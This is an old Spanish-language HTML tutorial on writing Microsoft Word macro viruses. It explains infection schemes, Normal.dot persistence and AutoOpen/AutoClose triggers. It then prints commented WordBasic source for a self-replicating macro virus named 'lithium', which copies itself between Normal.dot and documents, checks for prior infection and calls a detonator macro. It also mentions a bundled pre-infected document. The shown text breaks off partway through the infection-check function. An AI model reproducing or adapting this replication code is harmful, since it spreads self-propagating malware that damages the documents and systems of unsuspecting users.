<HTML>
<BODY>
<P ALIGN=LEFT><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B><FONT SIZE=4><I>Creaci&oacute;n
de Macrovirus</I> </FONT><SPAN STYLE="text-decoration: none"><SPAN STYLE="font-style: normal"><FONT SIZE=5><FONT FACE="Times New Roman, serif">I</FONT></FONT></SPAN></SPAN></B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT SIZE=1 STYLE="font-size: 8pt"><FONT FACE="Arial, sans-serif">Autor:
<FONT COLOR="#ff0000">&lt;+CoOL~ShADoW+&gt; </FONT>Mail:
<A HREF="mailto:cool_shadow_1@yahoo.com"><SPAN STYLE="text-decoration: none"><FONT COLOR="#ff0000">cool_shadow_1@yahoo.com
</FONT></SPAN></A>Fecha:<FONT COLOR="#ff0000"> 12/8/02</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="border-top: none; border-bottom: 1px solid #000000; border-left: none; border-right: none; padding-top: 0cm; padding-bottom: 0.07cm; padding-left: 0cm; padding-right: 0cm">
<BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>&Iacute;ndice</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>1
&#150; Introducci&oacute;n</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>2
&#150; C&aacute;racter&iacute;sticas</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">2.a
&#150; &iquest;Qu&eacute; es un macrovirus?</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">2.b
&#150; Esquema de un virus</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">2.c
&#150; Diferencias con un virus</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">2.d
&#150; Esquema de un macrovirus</FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>3
&#150; Normal.dot</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>4
&#150; C&oacute;digo fuente</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT STYLE="border-top: none; border-bottom: 1px solid #000000; border-left: none; border-right: none; padding-top: 0cm; padding-bottom: 0.07cm; padding-left: 0cm; padding-right: 0cm">
<BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=CENTER><FONT FACE="Arial, sans-serif"><FONT SIZE=3><B>1-
Introducci&oacute;n</B></FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Este
documento es creado con el fin de ense&ntilde;ar, lo que se haga con
el material expuesto es responsabilidad del lector.</FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Aclaremos
algunas cosas. Si quieres aprender a crear <B>verdaderos virus este
no es tu texto</B><SPAN STYLE="font-weight: medium">. Si piensas que
los mejores virus son los que m&aacute;s da&ntilde;o hacen eres un
idiota, as&iacute; que deja de leer. Si no tienes idea de que es la
programaci&oacute;n y algunas cosas b&aacute;sicas primero aprende lo
suficiente porque te ser&aacute; muy dif&iacute;cil entenderlo. Si
sabes un poquito de programaci&oacute;n</SPAN> y quieres saber como
funciona un macrovirus, como se multiplica etc. , sigue leyendo ;)
Aclarado esto vamos a ver que es un macrovirus, como funciona, sus
diferencias con los verdaderos virus, y como escribir uno.</FONT></FONT></P>
<P ALIGN=LEFT STYLE="border-top: none; border-bottom: 1px solid #000000; border-left: none; border-right: none; padding-top: 0cm; padding-bottom: 0.07cm; padding-left: 0cm; padding-right: 0cm">
<BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=CENTER><FONT FACE="Arial, sans-serif"><FONT SIZE=3><B>2 &#150;
Caracter&iacute;sticas</B></FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=2 STYLE="font-size: 9pt"><B>&iquest;Qu&eacute;
es un macrovirus?</B></FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">La
utilidad Word que viene incluida con Micro$of Office soporta un
lenguaje (Word Basic) al estilo de Visual Basic pero que no se compila, sino que
se ejecuta desde el archivo doc, el c&oacute;digo se guarda en el
archivo como &#147;Macro/s&#148;. Las macros algo as&iacute; como
funciones pero tambi&eacute;n como eventos, es algo raro. Cuando un
documento las tiene al abrirse se pregunta si se quiere cargarlas o
no por precauci&oacute;n. Esto ya es una barrera muy grande, ya que
alguien que no sabe que son no se arriesgar&aacute;. Lo que hace un
macrovirus para reproducirse es copiar estas macros a otros archivos
(ya veremos como se hace m&aacute;s adelante). Pero... &iquest;Cuando
infectar? Nombrando la macro para alg&uacute;n evento. Hay varios que
puedes usar, los m&aacute;s comunes en lo macrovirus son AutoOpen
(cuando se abre un archivo) y AutoClose (cuando se cierra), las dem&aacute;s
ser&iacute;a bueno que las aprendieras por ti mismo, tambi&eacute;n
se pueden usar algunos eventos para detonar ciertas partes del macro,
pero ese tema no me interesa.</FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=2 STYLE="font-size: 9pt"><B>Esquema
de un virus</B></FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Este
esquema es de un programa infectado un virus que utiliza determinado
m&eacute;todo de infecci&oacute;n, no todos son iguales.</FONT></FONT></P>
<DL>
	<DL>
		<DL>
			<DL>
				<DL>
					<DD>
					<TABLE WIDTH=251 BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
						<COL WIDTH=241>
						<THEAD>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Salta
									a <FONT COLOR="#ff0000">Virus</FONT></FONT></FONT></P>
								</TD>
							</TR>
						</THEAD>
						<TBODY>
							<TR>
								<TD WIDTH=241 VALIGN=TOP>
									<P ALIGN=CENTER><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>C&oacute;digo
									programa</B></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Virus</B></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Condicional
									a alg&uacute;n evento para detonar</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Salta
									<FONT COLOR="#ff0000">Buscar archivos</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Buscar
									archivos</B></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">quedan
									archivos?</FONT></FONT></P>
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Si</B>:
									salta a <FONT COLOR="#ff0000">Comprueba</FONT></FONT></FONT></P>
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>No</B>:
									salta a C&oacute;digo programa</FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Comprueba</B></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">est&aacute;
									infectado?</FONT></FONT></P>
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Si</B>:
									salta <FONT COLOR="#ff0000">Buscar archivos</FONT></FONT></FONT></P>
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>No</B>:
									salta <FONT COLOR="#ff0000">Infecta</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Infecta</B></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Copia
									de <FONT COLOR="#ff0000">Virus</FONT> en adelante al final
									del archivo</FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Escribe
									al principio del archivo un salto a <FONT COLOR="#ff0000">Virus</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=241 VALIGN=TOP BGCOLOR="#e6ff00">
									<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Cierra
									el archivo y salta a <FONT COLOR="#ff0000">Buscar archivos</FONT></FONT></FONT></P>
								</TD>
							</TR>
						</TBODY>
					</TABLE>
				</DL>
			</DL>
		</DL>
	</DL>
</DL>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=2 STYLE="font-size: 9pt"><B>Diferencias
con un virus</B></FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Adem&aacute;s
de la diferencias que hay en cuanto a que un virus puede estar hecho
en cualquier lenguaje (normalmente ensamblador por su flexibilidad y
porque no se crea c&oacute;digo basura) y que es mucho m&aacute;s
dif&iacute;cil de detectar hay diferencias en su estructura. Por
ejemplo, un virus creado en otros lenguajes puede infectar archivos
que se ejecutan. Por ejemplo los PE (portable ejecutable) y las DLL&acute;s
(Dinamick Link Library, se cargan en la memoria para ser utilizadas
por ciertos programas). En cambio los macrovirus solo pueden infectar
sus mismos tipos de archivos. Y la forma en la que infectan tiene una
gran diferencia que veremos en el siguiente esquema.</FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=2 STYLE="font-size: 9pt"><B>Esquema
de un macrovirus</B></FONT></FONT></P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Es
m&aacute;s o menos as&iacute; pero puede variar.</FONT></FONT></P>
<DL>
	<DL>
		<DL>
			<DL>
				<DL>
					<DD>
					<TABLE WIDTH=250 BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
						<COL WIDTH=240>
						<THEAD>
							<TR>
								<TH WIDTH=240 VALIGN=TOP BGCOLOR="#ffffcc">
									<P><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Macro
									- Evento (ej AutoClose)</FONT></FONT></FONT></P>
								</TH>
							</TR>
						</THEAD>
						<TBODY>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#e6ff00">
									<P><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Desde
									donde se ejecuta el macro?</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#e6ff00">
									<P><FONT COLOR="#000000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Llamada
									a la <FONT COLOR="#ff0000">funci&oacute;n comprobar</FONT></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#e6ff00">
									<P><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Llamada
									a <FONT COLOR="#ff0000">Detonar</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Termina
									AutoClose</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP>
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Funci&oacute;n
									comprobar</B></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#e6e6e6">
									<P><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Se
									encuentra la macro Detonar?</FONT></FONT></P>
									<P><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Si:
									No hace nada</FONT></FONT></P>
									<P><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">No:
									<SPAN STYLE="font-weight: medium">copia</SPAN> la macro
									<FONT COLOR="#ff0000">Detonar</FONT> y la macro <FONT COLOR="#ff0000">AutoClose</FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Macro
									- Detonar</B></FONT></FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#e6ff00">
									<P><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Condicionales
									y comandos para detonar</FONT></FONT></P>
								</TD>
							</TR>
							<TR>
								<TD WIDTH=240 VALIGN=TOP BGCOLOR="#ffffcc">
									<P ALIGN=CENTER><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Termina
									Detonar</FONT></FONT></FONT></P>
								</TD>
							</TR>
						</TBODY>
					</TABLE>
				</DL>
			</DL>
		</DL>
	</DL>
</DL>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Como
dije antes, la estructura puede variar un poco y se le pueden poner
m&aacute;s eventos para que detonen ciertas partes, por ejemplo al
imprimir, al escribir determinado texto, etc. pero la base es esa.</FONT></FONT></P>
<P ALIGN=LEFT STYLE="border-top: none; border-bottom: 1px solid #000000; border-left: none; border-right: none; padding-top: 0cm; padding-bottom: 0.07cm; padding-left: 0cm; padding-right: 0cm">
<BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=CENTER><FONT FACE="Arial, sans-serif"><FONT SIZE=3><B>3 &#150;
Normal.dot</B></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">El
normal.dot es la plantilla global de word. Esta sirve para guardar
macros que siempre vayas a usar. Lo primero que deber&iacute;a hacer
nuestro macrovirus es infectar este archivo, de este modo se
infectaran todos los dem&aacute;s archivos que abras aunque ya hallas
borrado el documento que conten&iacute;a las macros originalmente. De
vez en cuando revisa este archivo por si hay macros raras, si tu no
usas macros globales borra este archivo cada tanto para que el word
genera uno &#147;limpio&#148;.</FONT></FONT></P>
<P ALIGN=LEFT STYLE="border-top: none; border-bottom: 1px solid #000000; border-left: none; border-right: none; padding-top: 0cm; padding-bottom: 0.07cm; padding-left: 0cm; padding-right: 0cm">
<BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=CENTER><FONT FACE="Arial, sans-serif"><FONT SIZE=3><B>4 -
C&oacute;digo fuente</B></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">A
continuaci&oacute;n pondr&eacute; el c&oacute;digo fuente de un
macrovirus que hice como ejemplo una explicaci&oacute;n de este.</FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">NOTA:
por si no sabes como infectar un documento inclu&iacute; el archivo
lithium.doc que ya est&aacute; infectado. &Aacute;brelo con macros
pero recuerda no abrir ning&uacute;n documento m&aacute;s mientras
trabajes con &eacute;l y luego de cerrarlo borra el normal.dot</FONT></FONT></P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Sub
Autoclose() </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Macro
definida como Autoclose</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">On
Error GoTo Ikillyou <FONT COLOR="#000000">`Si hay un error salta a
Ikillyou que luego llama al detonador del virus</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">If
LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)),
10)) = &quot;<FONT COLOR="#ff0000">normal.dot</FONT>&quot; Then <FONT COLOR="#000000">`Si
se ejecuta desde el normal.dot</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><FONT COLOR="#008000">If
</FONT><FONT COLOR="#0000ff">dopado</FONT> <FONT COLOR="#008000">= no
Then </FONT><FONT COLOR="#000000">`Llama a la funci&oacute;n dopado
que se encarga de averiguar si est&aacute; infectado y si no lo est&aacute;
sigue</FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>WordBasic.FileSaveAs
Format:=1 </B></FONT></FONT></FONT>
</P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B><FONT COLOR="#008000">WordBasic.MacroCopy
&quot;Global:<FONT COLOR="#ff0000">AutoClose</FONT>&quot;,
WordBasic.[FileName$]() + &quot;:<FONT COLOR="#ff0000">AutoClose</FONT>&quot;
</FONT></B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Copia
el macro Autoclose desde normal.dot al archivo</FONT></SPAN></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>WordBasic.MacroCopy
&quot;Global:<FONT COLOR="#ff0000">lithium</FONT>&quot;,
WordBasic.[FileName$]() + &quot;:<FONT COLOR="#ff0000">litihum</FONT>&quot;
</B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Copia el
macro lithium desde normal.dot al archivo</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>WordBasic.FileSaveAll
1, 1 </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Guarda
los cambios</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">GoTo
Ikillyou <FONT COLOR="#000000">`Salta a Ikillyou que luego llama al
detonador del virus</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Else
<FONT COLOR="#000000">`Si no est&aacute; infectado no copia nada y
salta</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">GoTo
Ikillyou</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Else
<FONT COLOR="#000000">`Si no se ejecuta desde normal.dot</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">If
dopado = no Then <FONT COLOR="#000000">`Y no est&aacute; infectado</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>WordBasic.MacroCopy
WordBasic.[FileName$]() + &quot;:<FONT COLOR="#ff0000">AutoClose</FONT>&quot;,
&quot;Global:<FONT COLOR="#ff0000">AutoClose</FONT>&quot; </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Copia
el macro Autoclose desde el archivo a normal.dot</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>WordBasic.MacroCopy
WordBasic.[FileName$]() + &quot;:<FONT COLOR="#ff0000">lithium</FONT>&quot;,
&quot;Global:<FONT COLOR="#ff0000">lithium</FONT>&quot; </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Copia
el macro lithium desde el archivo a normal.dot</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>WordBasic.FileSaveAll
1, 0 </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Guarda
los cambios</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">GoTo
Ikillyou <FONT COLOR="#000000">`Salta a Ikillyou que luego llama al
detonador del virus</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Else
<FONT COLOR="#000000">`Si no est&aacute; infectado no copia nada y
salta</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">GoTo
Ikillyou</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">GoTo
Ikillyou</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Ikillyou:<FONT COLOR="#000000">
`El famoso salto que tanto pongo ;)</FONT></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Call
<FONT COLOR="#ff0000">lithium </FONT></B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Llamo
al macro lithium el cual es el detonador y tambi&eacute;n me sirve
para identificar los archivos infectados</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>End
Sub </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Termina
Autoclose</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT><BR><BR>
</P>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B><FONT COLOR="#0000ff">Function
dopado() </FONT></B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`Funci&oacute;n
que comprueba si un documento est&aacute; infectado, no comento m&aacute;s
porque ya se puede deducir su funcionamiento</FONT></SPAN></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">dopado
= no</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">If
LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)),
10)) = &quot;<FONT COLOR="#ff0000">normal.dot</FONT>&quot; Then</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">If
WordBasic.CountMacros(0) &gt; 0 Then</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">For
i = 1 To WordBasic.CountMacros(0)</FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>If
WordBasic.MacroName$(i, 0) = &quot;<FONT COLOR="#ff0000">lithium</FONT>&quot;
Then</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>dopado
= si</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
